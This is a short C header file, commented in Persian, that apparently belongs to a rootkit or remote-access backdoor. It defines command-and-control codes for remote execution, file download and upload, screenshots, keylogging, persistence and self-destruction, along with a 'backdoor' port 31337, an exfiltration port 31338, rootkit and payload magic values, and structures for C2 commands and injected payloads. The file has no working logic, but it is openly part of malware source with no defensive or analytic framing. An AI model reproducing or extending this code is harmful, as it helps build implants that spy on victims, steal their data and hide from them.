#ifndef DEFINES_H
#define DEFINES_H

// دستورات سیستمی
#define CMD_EXEC        0x01
#define CMD_DOWNLOAD    0x02
#define CMD_UPLOAD      0x03
#define CMD_SCREENSHOT  0x04
#define CMD_KEYLOG      0x05
#define CMD_PERSIST     0x06
#define CMD_SELF_DEST   0xFF

// پورت‌های مخفی
#define BACKDOOR_PORT   31337
#define EXFIL_PORT      31338

// امضاها
#define ROOTKIT_MAGIC   0xDEADBEEF
#define PAYLOAD_MAGIC   0xCAFEBABE

// ساختار دستور C2
struct c2_command {
    u32 magic;
    u8 cmd_type;
    u16 data_len;
    u8 data[];
};

// ساختار پیلود تزریقی
struct inject_payload {
    u32 magic;
    u8 code[];
};

#endif // DEFINES_H
